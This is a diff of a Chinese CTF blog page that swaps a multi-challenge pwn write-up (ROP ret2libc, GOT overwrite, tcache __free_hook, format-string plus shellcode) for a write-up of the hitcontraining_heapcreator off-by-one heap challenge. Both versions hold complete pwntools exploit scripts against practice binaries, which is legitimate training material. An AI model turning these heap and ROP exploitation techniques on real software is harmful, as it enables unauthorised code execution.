@@ -165,7 +165,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                buu-pwn(1)
+                                一道got表可写的off-by-one — hitcontraining_heapcreator
                             </h1>
                             
                                 <!--en-->
@@ -175,12 +175,12 @@
                                         lemon的自留地～
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2020-08-25</a>
+                                Date: <a href="#">2020-09-01</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">7.9
+                                    href="#">7.1
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">1637</a></span>
+                                    <span class="post-words">words:<a href="#">1469</a></span>
                                     
                                             Views:
                                             <span data-hk-page="current"> - </span>
@@ -190,251 +190,208 @@
                         </header>
                         
                         <div class="post-content">
-                            <h2 id="xdctf2015_pwn200">xdctf2015_pwn200</h2>
-<p>**题，简单题，五分钟能出的题给👴整了一个多小时，全是本地的libc咋也加载不上去，干脆直接LibcSearcher<br>
-没啥好说的，只开了nx<br>
-exp：</p>
-<pre><code class="language-python">from pwn import *
-from LibcSearcher import LibcSearcher
-#libc = ELF('./libc.so.6')
-#elf = ELF('./bof')
-local = 0
-
-if local == 1:
-    p = process('./bof')
-else:
-    p = remote('node3.buuoj.cn',25267)
-
-p.recvuntil('Welcome to XDCTF2015~!\n')
-
-offset = 0x6C + 0x4
-write_plt = 0x080483C0
-
-main_addr = 0x0804851C
-write_got = 0x0804A01C
-
-payload = offset * b'A' + p32(write_plt) + p32(main_addr) + p32(0) + p32(write_got) + p32(0x4)
-p.sendline(payload)
-
-write_addr = u32(p.recv()[0:4])
-
-libc = LibcSearcher('write',write_addr)
-
-print(&quot;write:&quot; + hex(write_addr))
-
-libc_base = write_addr - libc.dump('write')
-print('libcbase:' + hex(libc_base))
-
-system_addr = libc_base + libc.dump('system')
-binsh_addr = libc_base + libc.dump('str_bin_sh')
-print(hex(binsh_addr))
-payload = offset * b'A' + p32(system_addr) * 2 + p32(binsh_addr)
-p.sendline(payload)
-p.interactive()
-</code></pre>
-<h2 id="bjdctf-2ndsecret">[BJDCTF 2nd]secret</h2>
-<p>第一次碰见这样的题，好题！<br>
-没有做出来wtcl<br>
-总结，为啥没做出来？<br>
-1，找到溢出点了但是不知道怎么利用<br>
-2，碰见一堆汇编码就看不下去了，没有仔细分析<br>
-完整解题过程：<br>
-checksec发现只开了nx<br>
-拿到ida</p>
-<pre><code class="language-c">main函数： 
-__int64 __fastcall main(__int64 a1, char **a2, char **a3)
-{
-  myinit();
-  if ( judge(a1, a2) )
-    wrong();
-  system(&quot;cat /flag&quot;);
-  return 0LL;
-}
-</code></pre>
-<p>发现是有后门的，但是好像要不触发if才可以，如果if条件满足，就会进入wrong，点进去看看是这样的<br>
-wrong函数：</p>
-<pre><code class="language-c">void __noreturn wrong()
-{
-  puts(&quot;#====================================#&quot;);
-  puts(&quot;#             GAME OVER              #&quot;);
-  puts(&quot;#====================================#&quot;);
-  write_string(&quot;#        BYE BYE~                    #&quot;, 0x12);
-  printf(buf, 0x12LL);
-  puts(&amp;byte_46B0A7);
-  puts(&quot;@====================================@&quot;);
-  exit(0);
-}
-</code></pre>
-<p>就退出程序了，那么我们点进去if里面的judge函数看看<br>
-<img src="https://l3mon629.github.io/post-images/1598491054053.png" alt="" loading="lazy"><br>
-这段无法显示为伪代码（好像是大小限制的原因，改idc脚本应该可以反编译，但是我不会orz）<br>
-仔细阅读汇编码，可以发现里面有很多比较的操作，我们走到程序里，不妨输入一个数字看看，发现是猜数字的游戏，连续猜对就可以获得flag，但是要猜10000次，在myinit函数里面<br>
-<img src="https://l3mon629.github.io/post-images/1598491257565.png" alt="" loading="lazy"><br>
-第一个点是一个指针，里面存了10000，应该就是猜对的次数，但是是指针，指针都是非常危险的～<br>
-然后第二个点就是有一个read，可以溢出，我们点进去buf看看<br>
-<img src="https://l3mon629.github.io/post-images/1598491384660.png" alt="" loading="lazy"><br>
-可以看到那个指针就在buf下面0x10处，但是我们可控的空间是0x16，所以我们可以控制target指针。<br>
-那么我们控制到哪里呢？<br>
-我们在pwndbg里面发现printf的plt和system的plt很接近，就差0x10，而且是printf的plt比system的大0x10，所以我们可以把target改写成printf的got地址，然后每当猜对一次target就会减一，当我们猜对15次，第十六次猜错就会调用printf<br>
-<img src="https://l3mon629.github.io/post-images/1598494202026.png" alt="" loading="lazy"><br>
-而这个时候，printf@plt已经被改成了system@plt，然后存在buf里面的字符串会被当成参数传入system，所以我们只需要在输入name的时候把binsh打进去就好了<br>
-exp：</p>
-<pre><code class="language-python">from pwn import *
-
-local = 0
-
-#context.log_level = 'debug'
-
-if local == 1:
-    p = process('./secret')
-else:
-    p = remote('node3.buuoj.cn',25527)
-
-elf = ELF('./secret')
-printf_got = elf.got['printf']
-
-payload = b'/bin/sh\x00' + b'A' * (0x10 - 0x8) + b'\x40\xD0\x46'  #最后面的是printf的got地址，当然也可以用p32发过去                         
-
-#print(payload)
-p.sendline(payload)
-#pause()
-number = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63]        
-
-for i in range(0,15):
-	payload = number[i]
-	p.recvuntil('Secret:')
-	p.sendline(str(payload))
-#pause()
-p.sendlineafter('Secret:','1')
-p.interactive()
-</code></pre>
-<h2 id="ciscn_2019_es_1">ciscn_2019_es_1</h2>
-<p>今天太忙了，刚搬了宿舍，换了新环境，忙里偷闲打了一道去年的国赛题<br>
-目前就找到两种思路，第一种思路打fastbin的时候有些问题，因为不太清楚python怎么传空字符串之类的问题，导致结构体里面的指针一直在变，所以这种思路等过两天有空的时候再想想吧。第二种思路就是打__free_hook，__free_hook(ready to free) === system(&quot;/bin/sh\x00&quot;)<br>
-几个点：<br>
-当题目对于申请的chunk大小限制无要求，我们可以申请大chunk，free后放入unsorted bin直接泄漏libc<br>
-攻击__free_hook比one_gadget更简单<br>
+                            <p>这个题出了一些坑点，我吐了，做了好久<br>
+先正常走一遍吧<br>
+off-by-one的流程就是extend chunk<br>
+粗糙的写一下刻在DNA里的exp，细节问题错了就错了吧<br>
+malloc(overflow)<br>
+malloc(1)<br>
+malloc(2)<br>
+malloc(我来守护上面俩东西不被top chunk吃掉)</p>
+<p>edit(0,payload)<br>
+free(1)<br>
+free(2)</p>
+<p>leak_libc()<br>
+some_functions_addr()</p>
+<p>malloc(size(1) + size(2))<br>
+edit(1,写到chunk2的fd pointer)<br>
+然后就是fastbin attack</p>
+<p>嗯，我一开始也这样做的，很顺利在本地getshell，但是远程打不通</p>
+<h2 id="逆向">逆向</h2>
+<p>很容易，没有去除符号表，很nice<br>
+创建堆块，这里malloc(0x10)来管理堆块<br>
+<img src="https://l3mon629.github.io/post-images/1598930373627.png" alt="" loading="lazy"><br>
+编辑功能存在off-by-one漏洞，可以溢出一字节<br>
+<img src="https://l3mon629.github.io/post-images/1598930426660.png" alt="" loading="lazy"><br>
+free功能没有use after free 漏洞<br>
+<img src="https://l3mon629.github.io/post-images/1598930482188.png" alt="" loading="lazy"><br>
+show功能，可以来leak libc<br>
+<img src="https://l3mon629.github.io/post-images/1598930508252.png" alt="" loading="lazy"></p>
+<h2 id="pwn-it">pwn it！！！</h2>
+<h3 id="成功的方法借助heaparray来改写指针">成功的方法：借助heaparray来改写指针</h3>
+<p><img src="https://l3mon629.github.io/post-images/1598930723277.png" alt="" loading="lazy"><br>
+可以看到管理用户堆的内容上是有指针的，我最喜欢指针了（不是<br>
+然后我们可以改写指针，因为防护是这样的：<br>
+<img src="https://l3mon629.github.io/post-images/1598930796197.png" alt="" loading="lazy"><br>
+所以可以攻击got表，注意，攻击got的表的核心在于，，这个题是有现成的指针可以利用！如果没有的话，在ubuntu 16中，我们攻击got表的成本会很高，因为要伪造fastbin的size位<br>
+那我们思路就是本文一开始说的，只不过不覆盖fd指针而是覆盖题目给我们留下的罢了<br>
+先说说坑点吧，我用了libc-2.23.so，但是远程打不通，本地可通，就很难受，所以干脆直接LibcSearcher ，浪费了很多时间  😦<br>
+当时做题的思路都写在print语句里了，还挺好的<br>
 exp:</p>
 <pre><code class="language-python">from pwn import *
 from LibcSearcher import *
+
+#l3mon_w@nts_A_g1rLfri3nd (bushi)
+#context.log_level = 'debug'
+local = 1
+
+if local == 1:
+	p = process('./heapcreator')
+else:
+	p = remote('node3.buuoj.cn',28861)
+
+#libc = ELF('./libc.so.6')
+elf =  ELF('./heapcreator')
+
+def add(size,content):
+	p.sendlineafter('Your choice :','1')
+	p.sendlineafter('Size of Heap : ',str(size))
+	p.sendafter('Content of heap:',content)
+
+def edit(index,content):
+	p.sendlineafter('Your choice :','2')
+	p.sendlineafter('Index :',str(index))
+	p.sendafter('Content of heap : ',content)
+
+def show(index):
+	p.sendlineafter('Your choice :','3')
+	p.sendlineafter('Index :',str(index))
+
+def delete(index):
+	p.sendlineafter('Your choice :','4')
+	p.sendlineafter('Index :',str(index))
+
+print(&quot;第二个exp的思路是因为这个题目有heaparray来管理我们申请的堆块，在heaparray中有指向内容的指针，所以我们可以改写指针来覆盖got表（got表）可写&quot;)                                     
+
+add(0x18,'A')	#chunk0 : to overflow the next chunk
+add(0x30,'B')	#chunk1
+pause()
+add(0x60,'C')	#chunk2
+add(0x10,'/bin/sh\x00')	#chunk3 : to protect
+edit(0,b'B' * 0x18 + b'\xf1')
+
+delete(1)
+delete(2)
+print(&quot;此时big chunk已经构造完成，by gdb , we know the unsorted bin fd ptr and bk ptr&quot;)
+print(&quot;(by free 0x60 , we can change the fd pointer to fastbin attack) &lt;-------------------- 之前的思路&quot;)
+print(&quot;this method is attack free@got, the free(sth) = sysetm(/bin/sh;) &quot;)
+print(&quot;(if we cannot success ,we could use some methods to attack got) &lt;--------------------- so we change that :(      !!!!!!!&quot;)
+
+add(0xe0,'E')	#chunk4 = big chunk
+print(&quot;we can leak libc&quot;)
+show(1)
+
+p.recvuntil('Content : ')
+__malloc_hook = u64(p.recv(6) + b'\x00\x00') - 37 - 0x10
+libc = LibcSearcher('__malloc_hook',__malloc_hook)
+libc_base = __malloc_hook - libc.dump('__malloc_hook')
+print(hex(libc_base))
+
+print(&quot;by gdb , we know we already have leaked the libc&quot;)
+print(&quot;the next,we attack free@got &quot;)
+
+free_got = elf.got['free']
+#free_addr = libc_base + libc.symbols['free']
+system_addr = libc_base + libc.dump('system')
+print(&quot;free ----------&gt; &quot; + hex(free_got))
+print(&quot;system -------&gt; &quot; + hex(system_addr))
+
+payload = p64(__malloc_hook) * 2
+payload = payload + p64(0) + p64(0x41)
+payload = payload + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(free_got)
+edit(1,payload)
+
+add(0x60,'AAAAAAAA')	#chunk5 = chunk2
+print(&quot;!!!!!!!!!!!!!!!!!!!!!! 这里不确定编辑块5还是块2，我们就加上p.interactive()拿到原始的交互程序调试一下，经过调试发现没有块5，所以这里我们应该编辑chunk2&quot;)
+
+#edit(1,'BBBBBBBB')
+print(&quot;这里很奇怪，当时我发现大chunk的heaparray在它下面，我还以为是中间出现了不可预知的错误，但是经过调试发现，当我改块1的时候，free_got被改了，那只能证明是改chunk1了&quot;)
+print(&quot;小声bb，理不清流程就逐个调试（不是）&quot;)
+edit(1,p64(system_addr))
+
+print(&quot;通过free来触发 system(/bin/sh\00)  本地测试可拿shell， 美汁汁 :)    好，好起来了（不是）&quot;)
+delete(3)
+
+p.interactive()
+</code></pre>
+<h3 id="失败的方法one_gadget打__malloc_hook">失败的方法：one_gadget打__malloc_hook</h3>
+<p>本地也能拿shell，那肯定就是libc的原因了，one_gadget地址不一样的原因应该是<br>
+但是很奇葩，为神马这么说呢，当我打one_gadget的时候发现$rsp + 0x70的位置是NULL，但是one_gadget打不通，反倒是rsp + 0x30可以通<br>
+截图：<br>
+<img src="https://l3mon629.github.io/post-images/1598931293607.png" alt="" loading="lazy"><br>
+<img src="https://l3mon629.github.io/post-images/1598931426410.png" alt="" loading="lazy"><br>
+<img src="https://l3mon629.github.io/post-images/1598931431399.png" alt="" loading="lazy"><br>
+但是我用0x30的gadget竟然通了，本地可拿shell<br>
+<img src="https://l3mon629.github.io/post-images/1598931505659.png" alt="" loading="lazy"><br>
+不知道怎么回事，反正我人傻了，有感兴趣的师傅可以调试一下什么原因，然后给弟弟讲讲（orz<br>
+贴一下exp吧，下午再调试一下看看LibcSearcher能不能通<br>
+exp:</p>
+<pre><code class="language-python">from pwn import *
 
 #context.log_level = 'debug'
 local = 1
 
 if local == 1:
-	p = process('./ciscn_2019_es_1')
+	p = process('./heapcreator')
 else:
-	p = remote('node3.buuoj.cn',25338)
+	p = remote('node3.buuoj.cn',26697)
 
-def add(size,name,num):
-	p.sendlineafter('choice:','1')
-	p.sendlineafter('Please input the size of compary\'s name',str(size))
-	p.sendafter('please input name:',name)
-	p.sendafter('please input compary call:',num)
+libc = ELF('./libc.so.6')
+
+def add(size,content):
+	p.sendlineafter('Your choice :','1')
+	p.sendlineafter('Size of Heap : ',str(size))
+	p.sendafter('Content of heap:',content)
+
+def edit(index,content):
+	p.sendlineafter('Your choice :','2')
+	p.sendlineafter('Index :',str(index))
+	p.sendafter('Content of heap : ',content)
 
 def show(index):
-	p.sendlineafter('choice:','2')
-	p.sendlineafter('Please input the index:',str(index))
+	p.sendlineafter('Your choice :','3')
+	p.sendlineafter('Index :',str(index))
 
 def delete(index):
-	p.sendlineafter('choice:','3')
-	p.sendlineafter('Please input the index:',str(index))
+	p.sendlineafter('Your choice :','4')
+	p.sendlineafter('Index :',str(index))
 
-'''
-print(&quot;第一种思路：利用fastbin attack 攻击__malloc_hook函数，尚未成功&quot;)
-print(&quot;========== step 1 : leak libc ============&quot;)
-add(0x410,'a','b')	#0
-add(0x10,'c','d')	#1
-delete(0)
-show(0)
-p.recvuntil('name:\n')
-__malloc_hook = u64(p.recv(6) + b'\x00\x00') - 96 - 0x10
-libc = LibcSearcher('__malloc_hook',__malloc_hook)
-libc_base = __malloc_hook - libc.dump(&quot;__malloc_hook&quot;)
-print(&quot;libc base : &quot; + hex(libc_base))
+print(&quot;初步思路是off-by-one，可以溢出一个字节，所以我们考虑构造重叠chunk&quot;)
 
-print(&quot;=========== step 2 : fastbin attack =========&quot;)
-add(0x60,'A','B')	#3
-delete(3)
-delete(3)
-add(0x60,p64(__malloc_hook-0x23),'hack')
+add(0x18,'A')	#chunk0 : to overflow the next chunk
+add(0x30,'B')	#chunk1
+add(0x60,'C')	#chunk2
+add(0x10,'D')	#chunk3 : to protect
+edit(0,b'B' * 0x18 + b'\xf1')
 
-print(&quot;=========== step 3 : one_gadget =========&quot;)
-one_gadget_list = [0x4f2c5,0x4f322,0x10a38c]
+delete(1)
+print(&quot;此时big chunk已经构造完成，by gdb , we know the unsorted bin fd ptr and bk ptr&quot;)
+delete(2)
+print(&quot;by free 0x60 , we can change the fd pointer to fastbin attack&quot;)
+print(&quot;this method is 'one_gadget' &quot;)
+print(&quot;if we cannot success ,we could use some methods to attack got&quot;)
+
+add(0xe0,'E')	#chunk4
+print(&quot;we can leak libc&quot;)
+show(1)
+#p.recv()
+
+p.recvuntil('Content : ')
+__malloc_hook = u64(p.recv(6) + b'\x00\x00') - 37 - 0x10
+libc_base = __malloc_hook - libc.symbols['__malloc_hook']
+one_gadget_list = [0x3f3d6,0x3f42a,0xd5bf7]
 one_gadget = libc_base + one_gadget_list[1]
-add(0x60,0x13 * b'A' + p64(one_gadget),'hhhh')
-#add(0x10,'a','b')
+print(hex(libc_base))
+
+print(&quot;by gdb , we know we already have leaked the libc&quot;)
+print(&quot;the next,we do fake chunk&quot;)
+payload = p64(0) * 3 + p64(0x41) + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(0x9ba050) + p64(0) + p64(0x71)
+payload = payload + p64(__malloc_hook-0x23)
+edit(1,payload)
+
+add(0x60,p64(__malloc_hook-0x23))
+add(0x60,b'A' * 0x13 + p64(one_gadget))
 pause()
-p.interactive()
-'''
-print(&quot;第二种思路：利用unsorted bin逃逸出tcache bin，然后攻击__free_hook&quot;)
-print(&quot;====================== step1 : leak libc =================&quot;)
-add(0x410,b'A' * 8,b'B')	#0
-add(0x10,b'/bin/sh\00',b'D')		#1
-add(0x10,b'123',b'hack')		#2
-delete(0)
-show(0)
-p.recvuntil('name:\n')
-__malloc_hook = u64(p.recv(6) + b'\x00\x00') - 96 -0x10
-print(hex(__malloc_hook))
-
-libc = LibcSearcher('__malloc_hook',__malloc_hook)
-libc_base = __malloc_hook - libc.dump('__malloc_hook')
-print(&quot;libc base:&quot; + hex(libc_base))
-
-print(&quot;============ step2 : attack __free_hook function =================&quot;)
-print(&quot;__free_hook(chunk_mem) === system(binsh) &quot;)
-print(&quot;so we need change '__free_hook' to 'system' &quot;)
-
-__free_hook = libc_base + libc.dump(&quot;__free_hook&quot;)
-system_addr = libc_base + libc.dump(&quot;system&quot;)
-
-delete(2)
-delete(2)
-
-add(0x10,p64(__free_hook),b'lemon')		#3
-add(0x10,p64(system_addr),b'hack')		#4
-
-delete(2)
-p.interactive()
-</code></pre>
-<h2 id="临时加个攻防世界string">临时加个攻防世界：string</h2>
-<p>这个题是有个师傅问我的，其实原来做过了，但是好久没有玩过格式化字符串漏洞了，就重新做一下<br>
-收获的几个点：<br>
-1，注意mmap函数的第三个参数<br>
-2，shellcode = asm(shellcraft.sh())能打通，如果再加上str()就不可以了<br>
-exp:</p>
-<pre><code class="language-python">from pwn import *
-
-context.log_level = 'debug'
-local = 0
-
-if local == 1:
-	p = process('./dragon')
-else:
-	p = remote('220.249.52.133',37799)
-
-p.recvuntil(&quot;secret[0] is &quot;)
-address = int(p.recvuntil(&quot;\n&quot;),16)
-print(hex(address))
-
-p.sendlineafter(&quot;What should your character's name be:\n&quot;,'name')
-p.sendlineafter(&quot;So, where you will go?east or up?:\n&quot;,'east')
-p.sendlineafter(&quot;go into there(1), or leave(0)?:\n&quot;,'1')
-p.sendlineafter(&quot;'Give me an address'\n&quot;,str(address))
-
-print(&quot;经过测试，发现格式化字符串是第7个参数&quot;)
-payload = fmtstr_payload(7,{address:85})
-p.sendlineafter(&quot;And, you wish is:\n&quot;,payload)
-
-print(&quot;经过格式化字符串，我们可以发送shellcode了，因为mmap的第三个参数&quot;)
-context(os = 'linux',arch = 'amd64')
-shellcode = asm(shellcraft.sh())
-#shellcode = asm(shellcraft.amd64.linux.sh())
-print(shellcode)
-#shellcode = &quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;
-p.recvuntil(&quot;Wizard: I will help you! USE YOU SPELL&quot;)
-p.sendline(shellcode)
 p.interactive()
 </code></pre>
 
@@ -444,10 +401,13 @@ p.interactive()
                                 <ul class="markdownIt-TOC">
 <li>
 <ul>
-<li><a href="#xdctf2015_pwn200">xdctf2015_pwn200</a></li>
-<li><a href="#bjdctf-2ndsecret">[BJDCTF 2nd]secret</a></li>
-<li><a href="#ciscn_2019_es_1">ciscn_2019_es_1</a></li>
-<li><a href="#%E4%B8%B4%E6%97%B6%E5%8A%A0%E4%B8%AA%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cstring">临时加个攻防世界：string</a></li>
+<li><a href="#%E9%80%86%E5%90%91">逆向</a></li>
+<li><a href="#pwn-it">pwn it！！！</a>
+<ul>
+<li><a href="#%E6%88%90%E5%8A%9F%E7%9A%84%E6%96%B9%E6%B3%95%E5%80%9F%E5%8A%A9heaparray%E6%9D%A5%E6%94%B9%E5%86%99%E6%8C%87%E9%92%88">成功的方法：借助heaparray来改写指针</a></li>
+<li><a href="#%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%96%B9%E6%B3%95one_gadget%E6%89%93__malloc_hook">失败的方法：one_gadget打__malloc_hook</a></li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
@@ -465,7 +425,7 @@ p.interactive()
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://l3mon629.github.io/post/buu-pwn1/">https://l3mon629.github.io/post/buu-pwn1/</a></span>
+                                                <span><a href="https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/">https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -480,9 +440,9 @@ p.interactive()
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/buu-pwn1/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/buu-pwn1/&sharesource=qzone&title=buu-pwn(1)&pics=https://l3mon629.github.io/images/avatar.png?v=1598931580768&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/buu-pwn1/&sharesource=weibo&title=buu-pwn(1) + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1598931580768 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/&sharesource=qzone&title=一道got表可写的off-by-one — hitcontraining_heapcreator&pics=https://l3mon629.github.io/images/avatar.png?v=1598931580768&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/&sharesource=weibo&title=一道got表可写的off-by-one — hitcontraining_heapcreator + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1598931580768 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -503,13 +463,9 @@ p.interactive()
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/">
-                                                                                            一道got表可写的off-by-one — hitcontraining_heapcreator
-                                                                                        </a>
-                                                                                        
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/">
-                                                                                                    [V&amp;N2020 公开赛]easyTHeap
+                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/buu-pwn1/">
+                                                                                                    buu-pwn(1)
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
